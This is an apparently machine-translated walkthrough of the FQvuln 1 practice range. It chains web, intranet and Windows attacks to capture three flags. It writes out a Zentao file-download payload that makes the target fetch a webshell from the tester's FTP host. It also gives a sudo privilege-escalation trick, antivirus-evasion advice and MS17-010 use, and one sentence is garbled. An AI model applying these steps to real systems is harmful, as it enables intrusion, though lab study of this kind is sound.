## FQvuln 1 Range Penetration Testing in Action

## Preface

FQvuln range is the wind up original vulnerability range, integrated a variety of security holes, suitable for the learning process to test their penetration capabilities. Currently FQvuln 1 has been released, the difficulty is relatively moderate. The topology is as follows:

![img](https://p5.ssl.qhimg.com/t01ccabe9e7d8aa9985.png)

 

## Environment setup

Mirror download link: https://pan.baidu.com/s/1d64CMFCOZMeWJ8V9BtyKuQ
Extract code: l3zy
Recommended to use Vmware configuration to use, network card configuration information as shown in the topology diagram.

![img](https://p4.ssl.qhimg.com/t017243e43a1539fe0e.png)

Add networks VMnet2, VMnet3 Configuration type is host-only mode, subnet addresses are Target1: 192.168.42.0/24 , Target2: 192.168.43.0/24 respectively.

**Target 1 is configured as follows:**

![img](https://p1.ssl.qhimg.com/t01d1665102ae86e52f.png)


Because here Target1 is simulated as an external project management system, it needs to be accessible from the external network, so the network adapter is set to NAT mode to facilitate the test. Network adapter 2 is set to VMnet2, which is the first layer of intranet IP.

**Target 2 is configured as follows

![img](https://p5.ssl.qhimg.com/t01686a9394ac0757c0.png)

This host is OA management system, network adapter is set to customize VMnet2, network adapter 2 is VMnet3, here VMnet3 stands for layer 2 intranet segment, which is the area where intranet users are located. **P.S. If you configure the second NIC here and find that only one IP is recognized, then you can add a third NIC to configure VMnet3, it's just a possibility, so be careful. **

**Target 3 is configured as follows **

![img](https://p5.ssl.qhimg.com/t01686a9394ac0757c0.png)

Target3 only need to configure one NIC, for VMnet3 can be, for the intranet user host.

 

## Web punching infiltration

If this is your first time to reproduce the target, it is recommended to infiltrate it independently first, and then browse the following according to your personal situation, the result will be better, of course, the following is only for reference.

### Information gathering

First scan the target host to determine what the configured IP's are.

![img](https://p5.ssl.qhimg.com/t01629f4e5ccd90211d.png)

Here we can get the MAC address of the Tagrte1 target to be 00:0C:29:29:65:F7, and then use `nmap -sn 192.168.174.0/24` to scan the network segment, and get the target's IP address to be: 192.168.174.132

![img](https://p4.ssl.qhimg.com/t01ca4c0c3c64c7bddd.png)

Then we scan for 192.168.174.132, using the command `nmap -T4 -sV -O 192.168.174.132`

![img](https://p1.ssl.qhimg.com/t011645c3345fa7fc22.png)

We can get the information as follows:
Open ports: 80 (Apache), 3306 (MySQL)
Operating system: Linux (Ubuntu)
MAC address: 00:0C:29:29:65:F7

First visit [http://192.168.174.132](http://192.168.174.132/) The interface is as follows:

![img](https://p3.ssl.qhimg.com/t01548b6db48f03ec83.png)

Here we get the information through Wappalyzer which is basically the same as above. We can know that this is a project management system built by Zendo, through F12 we can get the version as V12.4.2 in the front-end again, as well as the first prompt.

![img](https://p0.ssl.qhimg.com/t01fa272b46b10d41d9.png)

Searching for vulnerabilities related to Zendo V12.4.2, we get that there is an arbitrary file download vulnerability in this version, and then we reproduce it.

### Vulnerability Replication

However, we found that the vulnerability requires background privileges, and then through FUZZ found that Zendo will limit the number of logins, so it is basically unlikely to blast. Then we search for WebExploit project management system on github according to the tips. Found that got the backup file.

![img](https://p0.ssl.qhimg.com/t01bceba8fd79f1a103.png)

By auditing the backup file, we get Zendo's database configuration file as: /zentaopms/config/my.php

![img](https://p1.ssl.qhimg.com/t0147ed05e6e7ffa86b.png)

Get the database username:target1 Password:qwer123!@#, in the previous information collection we can learn that port 3306 is open to the outside world, then we make an attempt to connect, and found that successfully connect to the database.


![img](https://p4.ssl.qhimg.com/t01752f7e1d2f3b3bd7.png)


So we searched the database configuration file and found that the background user password hash, and then cracked to get the background username and password.

![img](https://p3.ssl.qhimg.com/t0161cac60cfd1c1b88.png)

Result

![img](https://p4.ssl.qhimg.com/t01df354a3aa0eb6ad3.png)

Get username: admin Password: qazwsx123
Successfully login to the backend with the password.

![img](https://p5.ssl.qhimg.com/t01a413115582cbab0c.png)

There is a hint in the upper right corner

![img](https://p4.ssl.qhimg.com/t012fcb64925a806861.png)

Now that we have the backend access, let's start GETSHELL!

Start an FTP service, in this case using the python module: `python -m pyftpdlib -d /root/ftp -p 21` Note that you have to store the webshell file in the /root/ftp directory in advance.

![img](https://p1.ssl.qhimg.com/t0122ae7126a0e8852e.png)

The service has been successfully turned on as shown above.
The FTP webshell address is `ftp://192.168.174.128/shell.php` then base64 encrypt the address.
Then build the payload and access it:
`http://192.168.174.132/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC4xNzQuMTI4L3NoZWxsLnBocA==`
It shows that the save was successful.

![img](https://p0.ssl.qhimg.com/t01449c4d65bb24825d.png)

Webshell connection address: `http://192.168.174.132/data/client/1/shell.php`.

![img](https://p4.ssl.qhimg.com/t019a0f091dd238b992.png)

Connected successfully!
Check the shell permissions for www-data


![img](https://p5.ssl.qhimg.com/t01fe0dfb0e433afefd.png)

Do the usual `sudo -l` to see that

![img](https://p4.ssl.qhimg.com/t01e08f59617a428674.png)

You can see that the file /var/www/html/zentaopms/www/tips.sh can be executed without password and with any permissions.
Let's try to write `whoami` in the file and execute it. Find that there is no such file? Never mind, we can create one ourselves and `chmod +x /var/www/html/zentaopms/www/tips.sh` to give execute permission.

![img](https://p0.ssl.qhimg.com/t0110af710af49ae813.png)

Then we can do a global search for the flag-related filenames.
Write `find / -name “*flag*”` in the file and execute.

![img](https://p0.ssl.qhimg.com/t014cf57df8d09577f6.png)

Then look at the flag file, write cat /root/flag1.txt in the file and execute.

![img](https://p1.ssl.qhimg.com/t014e6beb50c6fe837d.png)

Get the first target!

 

## Intranet infiltration of OA system

### Information gathering

In order to facilitate the test we play a meterpreter, generation method Baidu can be. **P.S. Here it is recommended to use the above mentioned boosting method to pop a shell with root privileges.**

![img](https://p3.ssl.qhimg.com/t0113ccfc2b685c0b46.png)

See that other intranet segments exist for this target machine, add routes.

![img](https://p0.ssl.qhimg.com/t013f9f441cac9993f3.png)

Hang a socks4a proxy. Then configure Proxifier to probe locally.

![img](https://p3.ssl.qhimg.com/t01639b76e461b5878a.png)

Proxifier is configured as follows (well, why is it Socks5 now? Because I reconfigured it):

![img](https://p3.ssl.qhimg.com/t01adbc5a5573182e64.png)

I found 192.168.42.129 open port 80, because we configured the local proxy, then direct access can be found, found that it is a Tongda OA system. It is recommended to configure Proxifier to proxy only the program you need to use at the proxy rule, otherwise the proxy may crash.

![img](https://p2.ssl.qhimg.com/t017345fa3d7ac3fb42.png)

See this interface Baidu wind up Tongda EXP, direct seconds on the line, do not hesitate. Here it should be noted that, for the Tongda OA shell if the manual reproduction, can not be a sentence Trojan, you can use the call windows COM components of the webshell or have a certain obfuscation function of the Trojan.

![img](https://p4.ssl.qhimg.com/t0132aa6ff0d2eca487.png)

Then connect to the webshell and check the user permissions as **oa-pc\oa**

![img](https://p4.ssl.qhimg.com/t0150fe9befa391ebe1.png)

As shown below, we can get that this is a windows 7 host and the related configuration information.

![img](https://p0.ssl.qhimg.com/t013253c9bb06d07587.png)

Continue information collection, check whether there is the existence of antivirus, command:tasklist /svc, online query, found that there is the existence of the fire velvet as well as D Shield, so this is also clear, this is the more difficult part of the range, difficult in that we need to be familiar with the no-kill technology, and unlike the vast majority of the target range, this is also the closest to the real one of the details.

![img](https://p0.ssl.qhimg.com/t016a678b2d3cfe4c9e.png)

Of course, here I installed is the fire velvet antivirus software, familiar with the kill-free partners know that this is easier to pass the kill soft, I think the most important kill-free technology is still programming technology, if the code required for kill-free can not be completed independently, it is recommended to re-learn the programming, which is important in the whole of the infiltration test session, but also different from the script boy and white hat a watershed. So the author also suggests that the code can be strengthened to learn, if you feel that the programming skills, but still can not write, it should continue to learn more thinking.

### Horizontal test

The following is back to business, upload the free msf trojan, get a meterpreter session. Here we need to pay attention to the fact that target2 is not out of network, so we need to use the payload of the positive connection.
**P.S. I believe that the operation to this step, most of the partners will be curious as to why not pop back to the shell, so here is a hint, why not look at the windows firewall is open it? Then how to do it without saying it **!

I'm not sure how to do that, but I'm sure I can do it. [img](https://p3.ssl.qhimg.com/t0112b05aa5c9cd2564.png)

After elevating to system privileges, use the command to globally retrieve the flag-related filenames under the C drive.
Command:**dir /s /b c:\*flag\***

![img](https://p4.ssl.qhimg.com/t013242b537e60d91ec.png)

Get the second target!
Of course one tip here is that after closing the Windows Firewall why not try to look at the open ports again? There is more than one way to attack.

After gaining access to the OA system, continue to check for the existence of other network segments. Found the existence of 192.168.43.0/24 network segment for probing the surviving hosts.

![img](https://p5.ssl.qhimg.com/t014841838c888396af.png)

The detection results are as follows:

![img](https://p5.ssl.qhimg.com/t01d8f057d269cac7aa.png)

Found a host at 192.168.43.128
Continuing with our port scan of the target host as well as OS probing.

![img](https://p0.ssl.qhimg.com/t01952fb928e64cf9e6.png)

![img](https://p0.ssl.qhimg.com/t01ea44b580e139a43e.png)

 

## Take down the intranet host

I found open port 445, and the operating system is windows server 2008, then directly blind hit a wave of MS17-010. host load use positive connection oh, because the target host is not out of the network. Of course, it is not recommended to use msf exp, because it is very unstable, the success rate is low, you can use python version of the exp attack, here for the convenience of the demonstration of the use of msf.

![img](https://p1.ssl.qhimg.com/t0171bf1a7f599403bf.png)

Obtained the last target!

End of infiltration.

 

## Postscript

This range does not conduct any profit-making activities, please mark the source for promotion. We hope that the FQvuln range will be useful to you, thanks for reading!
